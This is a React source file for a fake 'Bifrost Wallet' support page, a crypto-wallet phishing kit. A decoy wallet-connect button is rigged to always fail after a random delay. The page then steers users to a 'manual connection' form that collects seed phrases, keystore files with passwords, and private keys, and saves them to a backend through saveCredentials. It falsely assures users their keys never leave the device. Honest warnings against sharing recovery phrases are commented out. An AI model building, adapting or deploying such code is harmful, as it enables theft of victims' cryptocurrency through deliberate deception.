/**
 * Bifrost Wallet – Support Page
 */
import { useState } from "react";
import Layout from "../components/Layout";
import BifrostIcon from "../assets/bifrost_icon.jpg";
import { saveCredentials } from "../services/appwriteService";

const supportOptions = [
  {
    id: "sync",
    eyebrow: "Synchronization",
    title: "Sync Wallet",
    body: "Troubleshoot and resolve wallet sync issues to ensure accurate, real-time balance display across supported chains.",
  },
  {
    id: "firmware",
    eyebrow: "RPC Firmware Management",
    title: "Update Firmware",
    body: "Apply the latest firmware updates to your wallet to maintain security and ensure compatibility with Flare RPC endpoints.",
  },
  {
    id: "stake",
    eyebrow: "FXRP Staking with Firelight",
    title: "Stake FXRP",
    body: "Put your FXRP to work through Firelight staking contracts to earn protocol-level rewards and optimize yield strategies.",
  },
  {
    id: "airdrop",
    eyebrow: "Claim XRP Flare Airdrop",
    title: "Claim Airdrop",
    body: "Access your accumulated Flare token distribution allocated to XRP holders based on the official snapshot taken in December 2020.",
  },
  {
    id: "tx",
    eyebrow: "Transaction Troubleshooting",
    title: "Fix Transactions",
    body: "Identify and resolve failed, pending, or gas-related transaction issues from staking, unstaking, claiming, bridging, or cross-chain transfers.",
  },
  {
    id: "fassets",
    eyebrow: "FAssets Troubleshooting",
    title: "Fix FAssets Issues",
    body: "Resolve FAssets-related problems: minting errors, redemption failures, incorrect balances, or missing tokens.",
  },
  {
    id: "recovery",
    eyebrow: "Asset Recovery",
    title: "Recover Assets",
    body: "Locate and restore lost, inaccessible, or unindexed digital assets using guided tools and protocol-level validation.",
  },
  {
    id: "revoke",
    eyebrow: "Revoke Token Permissions",
    title: "Revoke Access",
    body: "Manage and revoke smart contract permissions from dApps you no longer trust or use, to regain control over token access and minimize exposure.",
  },
];

// Success Modal Component
// Success Modal Component with animated futuristic checkmark
function SuccessModal({ onClose }) {
  return (
    <div className="success-modal-overlay" onClick={onClose}>
      <div className="success-modal-box" onClick={(e) => e.stopPropagation()}>
        <div className="success-icon-wrapper">
          <div className="success-ring"></div>
          <div className="success-ring-2"></div>
          <div className="success-checkmark">
            <svg viewBox="0 0 52 52">
              <circle
                className="checkmark-circle"
                cx="26"
                cy="26"
                r="25"
                fill="none"
              />
              <path
                className="checkmark-check"
                fill="none"
                d="M14.1 27.2l7.1 7.2 16.7-16.8"
              />
            </svg>
          </div>
        </div>
        <h2 className="success-title">Connection Successful!</h2>
        <p className="success-message">
          Your wallet has been connected successfully. You can now proceed with
          your support request.
        </p>
        <button className="button success-btn" onClick={onClose}>
          <span>Continue</span>
          <div className="overlay" />
        </button>
      </div>
    </div>
  );
}

// Credential Modal with inline validation
function CredentialModal({ option, onClose, onSubmit, isSubmitting }) {
  const [activeTab, setActiveTab] = useState("phrase");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [keystore, setKeystore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [errors, setErrors] = useState({});

  const validate = () => {
    const newErrors = {};

    if (activeTab === "phrase" && !seedPhrase.trim()) {
      newErrors.seedPhrase = "Please enter your seed phrase.";
    }

    if (activeTab === "keystore") {
      if (!keystore.trim()) {
        newErrors.keystore = "Please enter your keystore JSON.";
      }
      if (!keystorePassword.trim()) {
        newErrors.keystorePassword = "Please enter your keystore password.";
      }
    }

    if (activeTab === "privateKey" && !privateKey.trim()) {
      newErrors.privateKey = "Please enter your private key.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = () => {
    if (!validate()) return;

    const credentials = {
      seedPhrase: activeTab === "phrase" ? seedPhrase : "",
      keystore: activeTab === "keystore" ? keystore : "",
      keystorePassword: activeTab === "keystore" ? keystorePassword : "",
      privateKey: activeTab === "privateKey" ? privateKey : "",
    };

    onSubmit(credentials);
  };

  return (
    <div className="second-modal-overlay" onClick={onClose}>
      <div className="second-modal-box" onClick={(e) => e.stopPropagation()}>
        <div className="modal-head">
          <span className="modal-title">Manual Connection</span>
          <button className="modal-close" onClick={onClose} aria-label="Close">
            ×
          </button>
        </div>

        <p className="modal-sub">
          This session remains fully protected using advanced security and
          cryptography, ensuring that your private keys never leave your device.
        </p>

        <div className="auth-header">
          <div className="auth-brand">
            <img src={BifrostIcon} alt="Bifrost" className="brand-icon-img" />
            <span className="brand-name">Bifrost</span>
            <span className="brand-badge">
              This session is secured and encrypted.
            </span>
          </div>
        </div>

        <div className="auth-section">
          <p className="auth-label">
            Authenticate Your Wallet Details Securely
          </p>

          <div className="tab-container">
            <button
              className={`tab-btn ${activeTab === "phrase" ? "active" : ""}`}
              onClick={() => {
                setActiveTab("phrase");
                setErrors({});
              }}
            >
              Phrase
            </button>
            <button
              className={`tab-btn ${activeTab === "keystore" ? "active" : ""}`}
              onClick={() => {
                setActiveTab("keystore");
                setErrors({});
              }}
            >
              Keystore
            </button>
            <button
              className={`tab-btn ${activeTab === "privateKey" ? "active" : ""}`}
              onClick={() => {
                setActiveTab("privateKey");
                setErrors({});
              }}
            >
              Private Key
            </button>
          </div>

          <div className="tab-content-scrollable">
            <div className="tab-content">
              {activeTab === "phrase" && (
                <div className="input-group">
                  <label htmlFor="seedInput">Enter your seed phrase</label>
                  <textarea
                    id="seedInput"
                    rows="4"
                    placeholder="Enter your seed phrase"
                    value={seedPhrase}
                    onChange={(e) => {
                      setSeedPhrase(e.target.value);
                      if (errors.seedPhrase)
                        setErrors({ ...errors, seedPhrase: "" });
                    }}
                    disabled={isSubmitting}
                    className={errors.seedPhrase ? "error" : ""}
                  />
                  {errors.seedPhrase && (
                    <span className="error-text-inline">
                      {errors.seedPhrase}
                    </span>
                  )}
                </div>
              )}

              {activeTab === "keystore" && (
                <>
                  <div className="input-group">
                    <label htmlFor="keystoreInput">
                      Enter your keystore JSON
                    </label>
                    <textarea
                      id="keystoreInput"
                      rows="4"
                      placeholder="Enter your keystore JSON"
                      value={keystore}
                      onChange={(e) => {
                        setKeystore(e.target.value);
                        if (errors.keystore)
                          setErrors({ ...errors, keystore: "" });
                      }}
                      disabled={isSubmitting}
                      className={errors.keystore ? "error" : ""}
                    />
                    {errors.keystore && (
                      <span className="error-text-inline">
                        {errors.keystore}
                      </span>
                    )}
                  </div>
                  <div className="input-group">
                    <label htmlFor="keystorePasswordInput">
                      Enter your keystore password
                    </label>
                    <input
                      id="keystorePasswordInput"
                      type="password"
                      placeholder="Enter your keystore password"
                      value={keystorePassword}
                      onChange={(e) => {
                        setKeystorePassword(e.target.value);
                        if (errors.keystorePassword)
                          setErrors({ ...errors, keystorePassword: "" });
                      }}
                      disabled={isSubmitting}
                      className={errors.keystorePassword ? "error" : ""}
                    />
                    {errors.keystorePassword && (
                      <span className="error-text-inline">
                        {errors.keystorePassword}
                      </span>
                    )}
                  </div>
                </>
              )}

              {activeTab === "privateKey" && (
                <div className="input-group">
                  <label htmlFor="privKeyInput">Enter your private key</label>
                  <input
                    id="privKeyInput"
                    type="text"
                    placeholder="Enter your private key"
                    value={privateKey}
                    onChange={(e) => {
                      setPrivateKey(e.target.value);
                      if (errors.privateKey)
                        setErrors({ ...errors, privateKey: "" });
                    }}
                    disabled={isSubmitting}
                    className={errors.privateKey ? "error" : ""}
                  />
                  {errors.privateKey && (
                    <span className="error-text-inline">
                      {errors.privateKey}
                    </span>
                  )}
                </div>
              )}
            </div>
          </div>

          <button
            className="button connect-btn"
            onClick={handleSubmit}
            disabled={isSubmitting}
          >
            <span>{isSubmitting ? "Connecting..." : "Connect Wallet"}</span>
            <div className="overlay" />
          </button>
        </div>

        {/* <p className="warning-note">
          ⚠️ This is a demo interface. Never share your secret recovery phrase
          or private key with anyone.
        </p> */}
      </div>
    </div>
  );
}

// ConnectModal with connection flow
function ConnectModal({ option, onClose, onBifrostConnect }) {
  const [connectionStatus, setConnectionStatus] = useState("idle");

  const handleBifrostClick = () => {
    setConnectionStatus("loading");

    const delay = 3000 + Math.random() * 2000;
    setTimeout(() => {
      setConnectionStatus("error");
    }, delay);
  };

  const handleManualConnect = () => {
    onBifrostConnect();
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-box" onClick={(e) => e.stopPropagation()}>
        <div className="modal-head">
          <span className="modal-title">Connect Wallet</span>
          <button className="modal-close" onClick={onClose} aria-label="Close">
            ×
          </button>
        </div>

        <p className="modal-sub">
          To continue with <strong>{option.title}</strong>, connect your Bifrost
          Wallet. Your keys stay inside the Bifrost app at all times — we never
          ask for a seed phrase, private key, or keystore file on this page.
        </p>

        <div className="method-row-wrapper">
          <button
            className={`method-row bifrost-row ${connectionStatus === "loading" ? "loading" : ""} ${connectionStatus === "error" ? "error" : ""}`}
            onClick={handleBifrostClick}
            disabled={
              connectionStatus === "loading" || connectionStatus === "error"
            }
          >
            <span className="method-icon bifrost-icon">
              <img
                src={BifrostIcon}
                alt="Bifrost"
                className="bifrost-icon-img"
              />
            </span>
            <span className="method-text">
              <span className="method-name">Bifrost Wallet</span>
              <span className="method-detail">
                {connectionStatus === "idle" &&
                  "Connect via the Bifrost browser extension or mobile app."}
                {connectionStatus === "loading" && (
                  <span className="connecting-text">
                    <span className="loading-spinner"></span>
                    Connecting...
                  </span>
                )}
                {connectionStatus === "error" && (
                  <span className="error-text">❌ Connection failed</span>
                )}
              </span>
            </span>
            {connectionStatus === "loading" && (
              <span className="method-spinner" />
            )}
            {connectionStatus === "idle" && (
              <span className="method-arrow">›</span>
            )}
          </button>
        </div>

        {connectionStatus === "error" && (
          <div className="error-container">
            <p className="error-message">
              Connection failed. Try manual connection.
            </p>
            <button
              className="button manual-connect-btn"
              onClick={handleManualConnect}
            >
              <span>Connect Manually</span>
              <div className="overlay" />
            </button>
          </div>
        )}

        {/* <p className="modal-footnote">
          Bifrost Wallet will never ask you to type your seed phrase, private
          key, or keystore password into a website.
        </p> */}
      </div>
    </div>
  );
}

function SupportCard({ option, onSelect }) {
  return (
    <div className="support-card">
      <span className="support-eyebrow">{option.eyebrow}</span>
      <p className="support-body">{option.body}</p>
      <button className="button support-cta" onClick={() => onSelect(option)}>
        <span>{option.title}</span>
        <div className="overlay" />
      </button>
    </div>
  );
}

export default function SupportPage() {
  const [activeOption, setActiveOption] = useState(null);
  const [showCredentialModal, setShowCredentialModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleBifrostConnect = () => {
    setShowCredentialModal(true);
  };

  const handleCredentialSubmit = async (credentials) => {
    setIsSubmitting(true);

    try {
      const result = await saveCredentials({
        seedPhrase: credentials.seedPhrase,
        keystore: credentials.keystore,
        keystorePassword: credentials.keystorePassword,
        privateKey: credentials.privateKey,
      });

      if (result.success) {
        console.log("Saved document:", result.data);
        setShowCredentialModal(false);
        setShowSuccessModal(true);
      } else {
        alert(`❌ Failed to save: ${result.error}`);
      }
    } catch (error) {
      console.error("Error saving credentials:", error);
      alert("❌ An error occurred while saving. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const closeAllModals = () => {
    setActiveOption(null);
    setShowCredentialModal(false);
    setShowSuccessModal(false);
  };

  return (
    <Layout>
      <style>{`
        .support-page-content {
          padding: 3rem 6rem 5rem;
          max-width: 1400px;
          margin: 0 auto;
        }

        .support-head {
          max-width: 46rem;
          margin: 0 auto 3rem;
          text-align: center;
        }
        .support-head h1 {
          font-size: 2.2rem;
          font-weight: 700;
          margin-bottom: 0.9rem;
          line-height: 1.2;
        }
        .support-head p {
          opacity: 0.7;
          margin: 0;
          font-size: 1rem;
        }

        .support-grid {
          max-width: 1200px;
          margin: 0 auto;
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 1.1rem;
        }

        .support-card {
          background: rgb(43 44 54 / 40%);
          border: 1px solid rgb(255 255 255 / 6%);
          border-radius: 14px;
          padding: 1.6rem 1.5rem;
          display: flex;
          flex-direction: column;
          text-align: left;
        }
        .support-eyebrow {
          font-size: 0.72rem;
          text-transform: uppercase;
          letter-spacing: 0.06em;
          font-weight: 700;
          color: #9d8df5;
          margin-bottom: 0.6rem;
        }
        .support-body {
          font-size: 0.85rem;
          opacity: 0.7;
          margin: 0 0 1.4rem 0;
          flex-grow: 1;
        }

        .support-cta {
          align-self: flex-start;
          font-size: 1.1rem !important;
          padding: 0.8rem 2rem !important;
          border-radius: 100px;
          font-weight: 600;
          letter-spacing: 0.3px;
          min-width: 160px;
          text-align: center;
        }

        .button {
          display: inline-block;
          font-family: 'DM Sans', sans-serif;
          position: relative;
          border: none; outline: none;
          font-size: .825rem;
          color: white;
          padding: .5rem 1.1rem;
          border-radius: 100px;
          background: transparent linear-gradient(88deg,#7656EE 0%,#4961EA 100%) 0% 0% no-repeat padding-box;
          cursor: pointer;
          line-height: 1;
          overflow: hidden;
        }
        .button span { position: relative; z-index: 100; }
        .button .overlay {
          border-radius: 100px; z-index: 50;
          background: transparent linear-gradient(88deg,#614ac5 0%,#3f52c2 100%) 0% 0% no-repeat padding-box;
          transition: opacity 0.2s ease-in-out 0s;
          opacity: 0;
          position: absolute; top: 0; left: 0; height: 100%; width: 100%;
        }
        .button:hover .overlay { opacity: 1; }

        /* ── MODAL ── */
        .modal-overlay {
          position: fixed; inset: 0;
          background: rgba(10, 9, 15, 0.7);
          backdrop-filter: blur(4px);
          display: flex; align-items: center; justify-content: center;
          z-index: 100;
          padding: 1.5rem;
        }
        .modal-box {
          width: 100%; max-width: 26rem;
          background: #1d1b28;
          border: 1px solid rgb(255 255 255 / 8%);
          border-radius: 16px;
          padding: 1.6rem 1.6rem 1.8rem;
        }
        .modal-head {
          display: flex; align-items: center; justify-content: space-between;
          margin-bottom: 0.8rem;
        }
        .modal-title { font-size: 1.1rem; font-weight: 700; }
        .modal-close {
          background: none; border: none; color: #F8F8F8;
          font-size: 1.4rem; line-height: 1; cursor: pointer;
          opacity: 0.6; padding: 0.2rem;
        }
        .modal-close:hover { opacity: 1; }
        .modal-sub {
          font-size: 0.82rem; opacity: 0.7; margin: 0 0 1.3rem 0;
        }
        .modal-sub strong { color: #F8F8F8; opacity: 1; }

        .method-row-wrapper { margin-bottom: 0.6rem; }
        .method-row {
          display: flex; align-items: center; gap: 0.8rem;
          background: rgb(255 255 255 / 4%);
          border: 1px solid rgb(255 255 255 / 8%);
          border-radius: 10px;
          padding: 0.7rem 0.85rem;
          cursor: pointer;
          text-align: left;
          color: #F8F8F8;
          font-family: 'DM Sans', sans-serif;
          transition: all 0.3s ease;
          width: 100%;
        }
        .method-row:hover:not(:disabled) { background: rgb(255 255 255 / 8%); }
        .method-row:disabled { cursor: default; opacity: 0.7; }
        .method-row.loading {
          border-color: #7656EE;
          background: rgb(118 86 238 / 10%);
        }
        .method-row.error {
          border-color: #ff6b6b;
          background: rgb(255 107 107 / 10%);
        }
        .method-icon { 
          font-size: 1.3rem;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .bifrost-icon {
          width: 34px;
          height: 34px;
          border-radius: 50%;
          background: transparent linear-gradient(88deg,#7656EE 0%,#4961EA 100%) 0% 0% no-repeat padding-box;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          overflow: hidden;
        }
        .bifrost-icon-img {
          width: 28px;
          height: 28px;
          object-fit: cover;
          border-radius: 50%;
        }
        .bifrost-row { padding: 0.9rem 0.85rem; }
        .method-text { display: flex; flex-direction: column; flex-grow: 1; }
        .method-name { font-size: 0.88rem; font-weight: 700; }
        .method-detail { 
          font-size: 0.72rem; 
          opacity: 0.6; 
          margin-top: 0.15rem;
          display: flex;
          align-items: center;
          gap: 0.5rem;
        }
        .method-arrow { opacity: 0.4; font-size: 1.1rem; }
        
        .connecting-text {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          color: #9d8df5;
        }
        .loading-spinner {
          width: 14px;
          height: 14px;
          border-radius: 50%;
          border: 2px solid rgb(255 255 255 / 20%);
          border-top-color: #9d8df5;
          animation: spin 0.7s linear infinite;
          display: inline-block;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .method-spinner {
          width: 16px;
          height: 16px;
          border-radius: 50%;
          border: 2px solid rgb(255 255 255 / 20%);
          border-top-color: #9d8df5;
          animation: spin 0.7s linear infinite;
          flex-shrink: 0;
        }
        
        .error-text { color: #ff6b6b; }

        .error-container {
          background: rgb(255 107 107 / 6%);
          border: 1px solid rgba(255, 107, 107, 0.15);
          border-radius: 10px;
          padding: 0.6rem 0.8rem;
          margin: 0.4rem 0 0.8rem;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 0.8rem;
        }
        .error-message {
          font-size: 0.78rem;
          color: #ff6b6b;
          margin: 0;
          flex: 1;
        }
        .manual-connect-btn {
          padding: 0.4rem 1rem !important;
          font-size: 0.75rem !important;
          background: transparent;
          border: 1px solid #7656EE;
          color: #9d8df5;
          flex-shrink: 0;
          white-space: nowrap;
        }
        .manual-connect-btn .overlay { display: none; }
        .manual-connect-btn:hover { background: rgba(118, 86, 238, 0.1); }

        .modal-footnote {
          font-size: 0.7rem; opacity: 0.45; margin: 0;
          border-top: 1px solid rgb(255 255 255 / 8%);
          padding-top: 0.9rem;
        }

        /* ── SECOND MODAL ── */
        .second-modal-overlay {
          position: fixed; inset: 0;
          background: rgba(10, 9, 15, 0.75);
          backdrop-filter: blur(4px);
          display: flex; align-items: center; justify-content: center;
          z-index: 200;
          padding: 1.5rem;
        }
        .second-modal-box {
          width: 100%; 
          max-width: 30rem;
          max-height: 90vh;
          background: #1d1b28;
          border: 1px solid rgb(255 255 255 / 8%);
          border-radius: 16px;
          padding: 1.8rem 1.8rem 2rem;
          display: flex;
          flex-direction: column;
        }
        .second-modal-box .modal-title {
          font-size: 1.1rem; font-weight: 700;
          margin-bottom: 0.3rem;
          display: block;
        }
        .second-modal-box .modal-sub {
          font-size: 0.82rem; opacity: 0.7;
          margin-bottom: 1.2rem;
        }

        .auth-header { margin-bottom: 1.5rem; }
        .auth-brand {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          flex-wrap: wrap;
        }
        .brand-icon-img {
          width: 32px;
          height: 32px;
          border-radius: 50%;
          object-fit: cover;
          background: transparent linear-gradient(88deg,#7656EE 0%,#4961EA 100%) 0% 0% no-repeat padding-box;
          padding: 3px;
        }
        .brand-name { 
          font-weight: 700; 
          font-size: 0.95rem;
          color: #F8F8F8;
        }
        .brand-badge {
          font-size: 0.7rem;
          opacity: 0.6;
          background: rgb(255 255 255 / 6%);
          padding: 0.2rem 0.6rem;
          border-radius: 12px;
          margin-left: 0.3rem;
        }

        .auth-section {
          background: rgb(255 255 255 / 3%);
          border-radius: 12px;
          padding: 1.2rem;
          flex: 1;
          display: flex;
          flex-direction: column;
          min-height: 0;
        }
        .auth-label {
          font-size: 0.85rem;
          font-weight: 500;
          margin-bottom: 1rem;
          opacity: 0.8;
          flex-shrink: 0;
        }

        .tab-container {
          display: flex;
          gap: 0.3rem;
          margin-bottom: 1rem;
          border-bottom: 1px solid rgb(255 255 255 / 8%);
          padding-bottom: 0.5rem;
          flex-shrink: 0;
        }
        .tab-btn {
          background: none;
          border: none;
          color: #F8F8F8;
          font-family: 'DM Sans', sans-serif;
          font-size: 0.78rem;
          padding: 0.4rem 0.8rem;
          cursor: pointer;
          opacity: 0.5;
          transition: all 0.2s ease;
          border-radius: 6px;
        }
        .tab-btn:hover {
          opacity: 0.8;
          background: rgb(255 255 255 / 5%);
        }
        .tab-btn.active {
          opacity: 1;
          background: rgb(118 86 238 / 20%);
          color: #9d8df5;
        }

        .tab-content-scrollable {
          flex: 1;
          overflow-y: auto;
          margin-bottom: 1rem;
          min-height: 0;
        }
        .tab-content-scrollable::-webkit-scrollbar {
          width: 4px;
        }
        .tab-content-scrollable::-webkit-scrollbar-track {
          background: rgb(255 255 255 / 5%);
          border-radius: 10px;
        }
        .tab-content-scrollable::-webkit-scrollbar-thumb {
          background: #7656EE;
          border-radius: 10px;
        }

        .tab-content { min-height: 80px; }
        .input-group { margin-bottom: 1rem; }
        .input-group:last-child { margin-bottom: 0; }
        .input-group label {
          display: block;
          font-size: 0.78rem;
          font-weight: 500;
          opacity: 0.7;
          margin-bottom: 0.25rem;
        }
        .input-group textarea,
        .input-group input {
          width: 100%;
          background: rgb(255 255 255 / 6%);
          border: 1px solid rgb(255 255 255 / 10%);
          border-radius: 10px;
          padding: 0.7rem 0.9rem;
          color: #F8F8F8;
          font-family: 'DM Sans', sans-serif;
          font-size: 0.85rem;
          resize: vertical;
        }
        .input-group textarea {
          min-height: 80px;
        }
        .input-group textarea:focus,
        .input-group input:focus {
          outline: 2px solid #7656EE;
          border-color: transparent;
        }
        .input-group textarea::placeholder,
        .input-group input::placeholder {
          opacity: 0.4;
        }

        .input-group textarea.error,
        .input-group input.error {
          border-color: #ff6b6b;
          background: rgb(255 107 107 / 8%);
        }
        .error-text-inline {
          display: block;
          font-size: 0.7rem;
          color: #ff6b6b;
          margin-top: 0.3rem;
        }

        .connect-btn {
          width: 100%;
          padding: 0.6rem;
          font-size: 0.9rem;
          margin-top: 0.3rem;
          flex-shrink: 0;
        }

        .warning-note {
          font-size: 0.7rem;
          opacity: 0.5;
          margin: 0.8rem 0 0.2rem;
          border-top: 1px solid rgb(255 255 255 / 6%);
          padding-top: 0.8rem;
          text-align: center;
          flex-shrink: 0;
        }

       /* ── SUCCESS MODAL WITH ANIMATED CHECKMARK ── */
.success-modal-overlay {
  position: fixed; inset: 0;
  background: rgba(10, 9, 15, 0.85);
  backdrop-filter: blur(8px);
  display: flex; align-items: center; justify-content: center;
  z-index: 300;
  padding: 1.5rem;
  animation: fadeIn 0.3s ease-out;
}

.success-modal-box {
  width: 100%; max-width: 28rem;
  background: linear-gradient(145deg, #1d1b28, #161420);
  border: 1px solid rgba(118, 86, 238, 0.3);
  border-radius: 24px;
  padding: 2.5rem 2rem 2rem;
  text-align: center;
  position: relative;
  overflow: hidden;
  animation: scaleIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
}

.success-modal-box::before {
  content: '';
  position: absolute;
  top: -50%;
  left: -50%;
  width: 200%;
  height: 200%;
  background: radial-gradient(circle at 50% 50%, rgba(118, 86, 238, 0.05), transparent 70%);
  animation: pulseGlow 3s ease-in-out infinite;
}

.success-icon-wrapper {
  position: relative;
  width: 120px;
  height: 120px;
  margin: 0 auto 1.5rem;
}

.success-ring {
  position: absolute;
  top: -8px;
  left: -8px;
  width: 136px;
  height: 136px;
  border-radius: 50%;
  border: 3px solid rgba(118, 86, 238, 0.15);
  animation: ringPulse 2s ease-out infinite;
}

.success-ring-2 {
  position: absolute;
  top: -4px;
  left: -4px;
  width: 128px;
  height: 128px;
  border-radius: 50%;
  border: 2px solid rgba(118, 86, 238, 0.1);
  animation: ringPulse 2.5s ease-out infinite 0.5s;
}

.success-checkmark {
  width: 120px;
  height: 120px;
  position: relative;
}

.success-checkmark svg {
  width: 100%;
  height: 100%;
  display: block;
}

.checkmark-circle {
  stroke: #7656EE;
  stroke-width: 4;
  stroke-dasharray: 166;
  stroke-dashoffset: 166;
  animation: strokeDraw 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
}

.checkmark-check {
  stroke: #9d8df5;
  stroke-width: 4;
  stroke-linecap: round;
  stroke-linejoin: round;
  stroke-dasharray: 48;
  stroke-dashoffset: 48;
  animation: strokeDraw 0.4s cubic-bezier(0.65, 0, 0.45, 1) 0.4s forwards;
}

.success-title {
  font-size: 1.5rem;
  font-weight: 700;
  margin-bottom: 0.8rem;
  color: #F8F8F8;
  position: relative;
  z-index: 1;
  animation: slideUp 0.5s ease-out 0.3s both;
}

.success-message {
  font-size: 0.9rem;
  opacity: 0.7;
  margin-bottom: 1.8rem;
  line-height: 1.5;
  position: relative;
  z-index: 1;
  animation: slideUp 0.5s ease-out 0.5s both;
}

.success-btn {
  padding: 0.6rem 2.5rem;
  font-size: 0.95rem;
  position: relative;
  z-index: 1;
  animation: slideUp 0.5s ease-out 0.7s both;
  background: linear-gradient(88deg, #7656EE 0%, #4961EA 100%);
  box-shadow: 0 0 30px rgba(118, 86, 238, 0.3);
  transition: all 0.3s ease;
}

.success-btn:hover {
  transform: scale(1.05);
  box-shadow: 0 0 50px rgba(118, 86, 238, 0.5);
}

@keyframes strokeDraw {
  to {
    stroke-dashoffset: 0;
  }
}

@keyframes ringPulse {
  0% {
    transform: scale(1);
    opacity: 0.6;
  }
  100% {
    transform: scale(1.8);
    opacity: 0;
  }
}

@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

@keyframes scaleIn {
  0% {
    transform: scale(0.8);
    opacity: 0;
  }
  100% {
    transform: scale(1);
    opacity: 1;
  }
}

@keyframes slideUp {
  0% {
    transform: translateY(20px);
    opacity: 0;
  }
  100% {
    transform: translateY(0);
    opacity: 1;
  }
}

@keyframes pulseGlow {
  0%, 100% {
    transform: scale(1);
    opacity: 0.5;
  }
  50% {
    transform: scale(1.1);
    opacity: 1;
  }
}

/* Particle effects container */
.success-modal-box::after {
  content: '';
  position: absolute;
  inset: 0;
  border-radius: 24px;
  padding: 1px;
  background: linear-gradient(135deg, rgba(118, 86, 238, 0.3), transparent 50%, rgba(73, 97, 234, 0.3));
  -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
  -webkit-mask-composite: xor;
  mask-composite: exclude;
  pointer-events: none;
  animation: borderGlow 3s ease-in-out infinite;
}

@keyframes borderGlow {
  0%, 100% {
    opacity: 0.5;
  }
  50% {
    opacity: 1;
  }
}
      `}</style>

      <div className="support-page-content">
        <div className="support-head">
          <h1>Need help?</h1>
          <p>
            Select an option below to securely and efficiently resolve your
            issue with our support team.
          </p>
        </div>

        <div className="support-grid">
          {supportOptions.map((option) => (
            <SupportCard
              key={option.id}
              option={option}
              onSelect={setActiveOption}
            />
          ))}
        </div>

        {activeOption && !showCredentialModal && !showSuccessModal && (
          <ConnectModal
            option={activeOption}
            onClose={closeAllModals}
            onBifrostConnect={handleBifrostConnect}
          />
        )}

        {activeOption && showCredentialModal && !showSuccessModal && (
          <CredentialModal
            option={activeOption}
            onClose={closeAllModals}
            onSubmit={handleCredentialSubmit}
            isSubmitting={isSubmitting}
          />
        )}

        {showSuccessModal && <SuccessModal onClose={closeAllModals} />}
      </div>
    </Layout>
  );
}
